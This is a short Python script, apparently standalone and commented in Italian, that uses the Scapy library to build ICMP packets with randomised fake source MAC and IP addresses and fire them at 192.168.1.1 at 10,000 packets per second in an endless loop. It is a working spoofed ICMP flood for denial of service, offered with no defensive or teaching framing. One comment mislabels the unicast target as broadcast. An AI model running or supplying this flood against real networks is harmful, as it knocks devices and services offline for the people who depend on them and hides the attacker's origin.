from scapy.all import *

iface = "eth0"

# Pacchetto ICMP con IP/MAC falsi
pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC()) / IP(
    src=RandIP(),    # IP sorgente falso
    dst="192.168.1.1"  # IP target (broadcast)
) / ICMP()

# Invio veloce dei pacchetti
sendpfast(pkt, pps=10000, loop=0, iface=iface)